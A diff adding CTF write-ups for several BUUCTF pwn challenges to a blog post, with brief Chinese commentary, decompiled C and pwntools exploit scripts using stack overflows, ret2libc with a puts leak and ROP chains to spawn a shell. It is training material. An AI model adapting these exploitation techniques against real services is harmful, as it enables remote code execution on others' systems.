@@ -1,7 +1,7 @@
 ---
 title: "Write-ups: BUUCTF"
 published: 2025-07-05
-updated: 2025-07-28
+updated: 2025-07-30
 description: "Write-ups for BUUCTF's pwn aspect."
 image: "https://jsd.cdn.zzko.cn/gh/CuB3y0nd/picx-images-hosting@master/.77dus3996s.avif"
 tags: ["Pwn", "Write-ups"]
@@ -1310,6 +1310,329 @@ def main():
     target.recvuntil(b"\x0a")
     payload = flat(b"A" * 0xEB, libc.sym["system"], 0, next(libc.search(b"/bin/sh")))
     target.send(payload)
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+# ciscn_2019_n_5
+
+## Information
+
+- Category: Pwn
+- Points: 1
+
+## Write-up
+
+一个保护都没开，本来想打 ret2shellcode，但是奈何没给 libc，啥也不是！
+
+无奈，只得使用好久没用过的 `LibcSearcher` 了 lol
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+from pwn import (
+    ROP,
+    args,
+    context,
+    flat,
+    process,
+    raw_input,
+    remote,
+    u64,
+)
+
+from LibcSearcher.LibcSearcher import LibcSearcher
+
+FILE = "./ciscn_2019_n_5"
+HOST, PORT = "node5.buuoj.cn", 26903
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+rop = ROP(elf)
+
+
+def launch():
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+    return target
+
+
+def main():
+    target = launch()
+
+    # raw_input("DEBUG")
+
+    target.sendlineafter(b"name", b"")
+    payload = flat(
+        b"A" * 0x28,
+        rop.rdi.address,
+        elf.got["puts"],
+        elf.plt["puts"],
+        elf.sym["main"],
+    )
+    target.sendlineafter(b"me?", payload)
+
+    target.recvline()
+    leaked_puts = u64(target.recv(0x6).strip().ljust(0x8, b"\x00"))
+    libc = LibcSearcher("puts", leaked_puts)
+    libc_base = leaked_puts - libc.dump("puts")
+
+    payload = flat(
+        b"A" * 0x28,
+        rop.rdi.address,
+        libc_base + libc.dump("str_bin_sh"),
+        rop.ret.address,
+        libc_base + libc.dump("system"),
+        libc_base + libc.dump("exit"),
+    )
+    target.sendlineafter(b"name", b"")
+    target.sendlineafter(b"me?", payload)
+
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+# not_the_same_3dsctf_2016
+
+## Information
+
+- Category: Pwn
+- Points: 1
+
+## Write-up
+
+BOF，ROP Chain，有后门函数 `get_secret`，会将 flag 写入 bss，我们通过 write 输出 bss 内容即可。
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+from pwn import (
+    ROP,
+    args,
+    constants,
+    context,
+    flat,
+    process,
+    raw_input,
+    remote,
+)
+
+FILE = "./not_the_same_3dsctf_2016"
+HOST, PORT = "node5.buuoj.cn", 25163
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+rop = ROP(elf)
+
+
+def launch():
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+    return target
+
+
+def main():
+    target = launch()
+
+    # raw_input("DEBUG")
+    payload = flat(
+        b"A" * 0x2D,
+        elf.sym["get_secret"],
+        elf.sym["write"],
+        elf.sym["exit"],
+        constants.STDOUT_FILENO,
+        elf.bss() + 0xAAD,
+        1337,
+    )
+    target.sendline(payload)
+
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+# ciscn_2019_en_2
+
+## Information
+
+- Category: Pwn
+- Points: 1
+
+## Write-up
+
+不理解，这题和 [ciscn_2019_c_1](#ciscn_2019_c_1) 不是一样的吗？
+
+## Exploit
+
+Same as [ciscn_2019_c_1](#ciscn_2019_c_1).
+
+# ciscn_2019_ne_5
+
+## Information
+
+- Category: Pwn
+- Points: 1
+
+## Write-up
+
+```c ins={24} collapse={4-21, 27-56}
+// bad sp value at call has been detected, the output may be wrong!
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int result; // eax
+  int v4; // [esp+0h] [ebp-100h] BYREF
+  char src[4]; // [esp+4h] [ebp-FCh] BYREF
+  char v6[124]; // [esp+8h] [ebp-F8h] BYREF
+  char s1[4]; // [esp+84h] [ebp-7Ch] BYREF
+  _BYTE v8[96]; // [esp+88h] [ebp-78h] BYREF
+  int *p_argc; // [esp+F4h] [ebp-Ch]
+
+  p_argc = &argc;
+  setbuf(stdin, 0);
+  setbuf(stdout, 0);
+  setbuf(stderr, 0);
+  fflush(stdout);
+  *(_DWORD *)s1 = 48;
+  memset(v8, 0, sizeof(v8));
+  *(_DWORD *)src = 48;
+  memset(v6, 0, sizeof(v6));
+  puts("Welcome to use LFS.");
+  printf("Please input admin password:");
+  __isoc99_scanf("%100s", s1);
+  if ( strcmp(s1, "administrator") )
+  {
+    puts("Password Error!");
+    exit(0);
+  }
+  puts("Welcome!");
+  while ( 1 )
+  {
+    puts("Input your operation:");
+    puts("1.Add a log.");
+    puts("2.Display all logs.");
+    puts("3.Print all logs.");
+    printf("0.Exit\n:");
+    __isoc99_scanf("%d", &v4);
+    switch ( v4 )
+    {
+      case 0:
+        exit(0);
+        return result;
+      case 1:
+        AddLog((int)src);
+        break;
+      case 2:
+        Display(src);
+        break;
+      case 3:
+        Print();
+        break;
+      case 4:
+        GetFlag(src);
+        break;
+      default:
+        continue;
+    }
+  }
+}
+```
+
+bypass password 没啥好说的，main 函数中 `__isoc99_scanf("%100s", s1);` 虽然可以破坏一些栈布局，但是程序下面有个 while 死循环，以致 main 不会返回，所以肯定不能通过这个输入构造 ROP Chain.
+
+继续往下看，while 里面的 scanf 也没有漏洞，不过发现一个隐藏选项 4。一个一个看，`AddLog` 里面有一个 scanf，接收 128 字节，可以破坏栈布局，但是也不能用它构造 ROP Chain，因为`AddLog` 是返回读取到的字节数，返回后又是一轮循环。
+
+```c del={4}
+int __cdecl AddLog(int a1)
+{
+  printf("Please input new log info:");
+  return __isoc99_scanf("%128s", a1);
+}
+```
+
+`Display` 可以泄漏栈内容，或许有用，先放一边。
+
+`Print` 里面调用了一个 `system`，说明我们可以直接用 `system@plt` 调用这个函数。
+
+`GetFlag` 将我们输入 buffer 的内容直接复制到 `dest`，由于这个 `dest` 是局部数组，只有 4 字节空间，`strcpy` 没有安全检查，我们可以利用这一点篡改 `GetFlag` 栈帧的返回地址为 ROP Chain.
+
+```c del={8}
+int __cdecl GetFlag(char *src)
+{
+  char dest[4]; // [esp+0h] [ebp-48h] BYREF
+  _BYTE v3[60]; // [esp+4h] [ebp-44h] BYREF
+
+  *(_DWORD *)dest = 48;
+  memset(v3, 0, sizeof(v3));
+  strcpy(dest, src);
+  return printf("The flag is your log:%s\n", dest);
+}
+```
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+from pwn import (
+    args,
+    context,
+    fit,
+    process,
+    raw_input,
+    remote,
+)
+
+FILE = "./ciscn_2019_ne_5"
+HOST, PORT = "node5.buuoj.cn", 27219
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+
+
+def launch():
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+    return target
+
+
+def main():
+    target = launch()
+
+    target.sendlineafter(b"password:", b"administrator")
+
+    payload = fit(
+        {
+            0x4C: elf.plt["system"],
+            0x50: elf.plt["exit"],
+            0x54: next(elf.search(b"sh")),
+        }
+    )
+    # raw_input("DEBUG")
+    target.sendlineafter(b"Exit", str(1).encode())
+    target.sendlineafter(b"info:", payload)
+    target.sendlineafter(b"Exit", str(4).encode())
+
     target.interactive()
 
 
